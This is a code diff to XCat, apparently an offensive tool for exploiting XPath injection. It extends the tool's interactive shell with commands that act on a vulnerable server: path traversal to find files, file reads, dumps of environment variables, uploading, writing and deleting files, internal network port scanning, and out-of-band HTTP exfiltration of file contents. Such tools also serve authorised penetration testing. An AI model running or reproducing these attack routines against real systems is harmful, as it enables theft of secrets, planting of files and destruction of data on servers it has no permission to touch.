@@ -15,9 +15,12 @@ import asyncio
 import aiohttp
 import operator
 import ipgetter
-import aioconsole
+import ipaddress
+import pathlib
 
-from xcat.algorithms import iterate_all, count
+import sys
+
+from xcat.algorithms import iterate_all, count, get_string_via_oob, get_string
 from xcat.requester import Requester
 from xcat.payloads import detect_payload
 from xcat.features import detect_features
@@ -25,10 +28,14 @@ from xcat import actions
 from typing import Callable
 from xcat.display import display_xml
 import shlex
+import base64
 
 from xcat.xpath import E
-from xcat.xpath.xpath_2 import doc
-from xcat.xpath.xpath_3 import unparsed_text_lines
+from xcat.xpath.fs import write_text, write_binary, append_binary, base_64_binary, delete
+from xcat.xpath.xpath_1 import concat, string
+from xcat.xpath.xpath_2 import doc, document_uri, current_date_time, doc_available, resolve_uri
+from xcat.xpath.xpath_3 import unparsed_text_lines, unparsed_text_available, unparsed_text, \
+    available_environment_variables, environment_variable
 
 
 def run():
@@ -57,10 +64,13 @@ def run():
     fast = arguments['--fast']
 
     loop = asyncio.get_event_loop()
-    loop.run_until_complete(start_action(url, target_parameter,
-                                         parameters, match_function,
-                                         oob_ip, oop_port,
-                                         shell, fast))
+    try:
+        loop.run_until_complete(start_action(url, target_parameter,
+                                             parameters, match_function,
+                                             oob_ip, oop_port,
+                                             shell, fast))
+    except KeyboardInterrupt:
+        loop.stop()
 
 
 async def start_action(url, target_parameter, parameters, match_function, oob_ip, oob_port, shell, fast):
@@ -134,7 +144,7 @@ def make_match_function(arguments) -> Callable[[aiohttp.Response, str], bool]:
 
 async def run_shell(requester: Requester):
     # This function is horrible and I feel bad :(
-
+    loop = asyncio.get_event_loop()
     try:
         import readline
     except ImportError:
@@ -151,8 +161,11 @@ async def run_shell(requester: Requester):
 
     print("XCat shell. Enter a command or 'help' for help. Funnily enough.")
     while True:
-        cmd = await aioconsole.ainput('>> ')
+        cmd = input('>> ')
         command = shlex.split(cmd)
+
+        if not command:
+            continue
 
         if command[0] == "help":
             pass
@@ -163,24 +176,171 @@ async def run_shell(requester: Requester):
             else:
                 await display_xml([await actions.get_nodes(requester, E(command[1]))])
 
-        if command[0] == "read_xml":
-            if len(command) != 2:
-                print("read_xml 'xml path'")
+        if command[0] == 'pwd':
+            if requester.features['document-uri']:
+                print(await get_string(requester, document_uri(E('/'))))
             else:
-                await display_xml([await actions.get_nodes(requester, doc(command[1]))])
+                print('document-uri function not supported with this injection')
 
-        if command[0] == "read_text":
+        if command[0] == 'time':
+            if requester.features['current-datetime']:
+                print(await get_string(requester, string(current_date_time())))
+            else:
+                print('current-dateTime not supported with this injection')
+
+        if command[0] == 'find-file':
             if len(command) != 2:
-                print("read_text 'text path'")
+                print('find-file "path"')
+            else:
+                if not requester.features['unparsed-text'] and not requester.features['doc-function']:
+                    print('unparsed-text and doc function not available. Cannot continue')
+                    continue
+
+                for i in range(10):
+                    path = ('../' * i) + command[1]
+                    print(path)
+
+                    path_expression = resolve_uri(path, document_uri(E('/')))
+
+                    if requester.features['doc-function']:
+                        if await requester.check(doc_available(path_expression)):
+                            print(f'XML file {path} available')
+
+                    if requester.features['unparsed-text']:
+                        if await requester.check(unparsed_text_available(path_expression)):
+                            print(f'Text file {path} available')
+
+        if command[0] == 'write-text':
+            if len(command) != 3:
+                print('write-text "location" "text"')
+            else:
+                if not requester.features['expath-file']:
+                    print('expath not supported, cannot continue')
+                    continue
+
+                location, text = command[1], command[2]
+                print(f'Writing {text} to {location}')
+                if await requester.check(write_text(location, text)):
+                    print('Appeared to succeed!')
+                else:
+                    print('Appeared not to succeed. Might have though')
+
+        if command[0] == 'upload':
+            if len(command) != 3:
+                print('upload "local path" "remote path"')
+            else:
+                if not requester.features['expath-file']:
+                    print('expath not supported, cannot continue')
+                    continue
+
+                local, remote = pathlib.Path(command[1]), command[2]
+                if not local.exists():
+                    print(f'Cannot find {local}!')
+                    continue
+
+                print(f'Uploading {local} to {remote}')
+                data = local.read_bytes()
+                print(f'Length: {len(data)} bytes')
+                chunks = list(split_chunks(data, 256))
+                print(f'Uploading {len(chunks)} chunks')
+
+                await requester.check(delete(remote))
+
+                for i, chunk in enumerate(chunks, 1):
+                    chunk = base64.b64encode(chunk).decode()
+                    for _ in range(5):
+                        if await count(requester, append_binary(remote, base_64_binary(chunk)) == 0):
+                            sys.stdout.write('.')
+                            break
+                        else:
+                            sys.stdout.write('!')
+                    else:
+                        print(f'Failed to upload chunk {i} 5 times. Giving up. Sorry.')
+                    sys.stdout.flush()
+
+                sys.stdout.write('\n')
+
+        if command[0] == 'rm':
+            if len(command) != 2:
+                print('rm "path"')
+            else:
+                if not requester.features['expath-file']:
+                    print('expath fs extensions not found, cannot continue')
+                    continue
+
+                if not await count(requester, delete(command[1])) == 0:
+                    print('Failed to delete file')
+                else:
+                    print('Deleted')
+
+        if command[0] == 'env':
+            if requester.features['environment-variables']:
+                all_exp = available_environment_variables()
+                total = await count(requester, all_exp)
+                env_output = [
+                    concat(env_name, ' = ', environment_variable(env_name))
+                    for env_name in all_exp[:total + 1]
+                ]
+                async for variable in iterate_all(requester, env_output):
+                    print(variable)
+            else:
+                print('environment-variables not supported with this injection')
+
+        if command[0] == "scan":
+            if len(command) != 3:
+                print('scan "ip address or network" port')
+            else:
+                addr, port = command[1], command[2]
+                try:
+                    if '/' in addr:
+                        addresses = list(ipaddress.ip_network(addr))
+                    else:
+                        addresses = [ipaddress.ip_address(addr)]
+                except ValueError as e:
+                    print(f'Error: {e}')
+                else:
+                    print(f'Scanning {len(addresses)} addresses')
+                    for addr in addresses:
+                        http_addr = f'http://{addr}:{port}/'
+                        if await requester.check(unparsed_text_available(http_addr)):
+                            print(f'{addr}:{port} - available')
+
+        if command[0] == "cat_xml":
+            if len(command) != 2:
+                print("cat_xml 'path'")
+            else:
+                await display_xml([await actions.get_nodes(requester, doc(command[1]).add_path('/*'))])
+
+        if command[0] in {"cat", "ls"}:
+            if len(command) != 2:
+                print(f"{command[0]} 'path'")
             else:
                 if requester.features['unparsed-text']:
-                    expression = unparsed_text_lines(command[1])
-                    length = await count(requester, expression)
-                    print(f"Lines: {length}")
-                    async for line in iterate_all(requester, expression[1:length + 1]):
-                        print(line)
+                    if not await requester.check(unparsed_text_available(command[1])):
+                        print(f'File {command[1]} doesn\'t seem to be available.')
+                        if input('Continue anyway? [y/n] ').lower() != 'y':
+                            continue
+
+                    if requester.features['oob-http']:
+                        # Fetch in one go
+                        expression = unparsed_text(command[1])
+                        print(await get_string_via_oob(requester, expression))
+                    else:
+                        # Line by line
+                        expression = unparsed_text_lines(command[1])
+                        length = await count(requester, expression)
+                        print(f"Lines: {length}")
+                        async for line in iterate_all(requester, expression[:length + 1]):
+                            print(line)
                 elif requester.features['oob-entity-injection']:
                     pass
+
+
+def split_chunks(l, n):
+    """Yield successive n-sized chunks from l."""
+    for i in range(0, len(l), n):
+        yield l[i:i + n]
+
 
 if __name__ == "__main__":
     run()
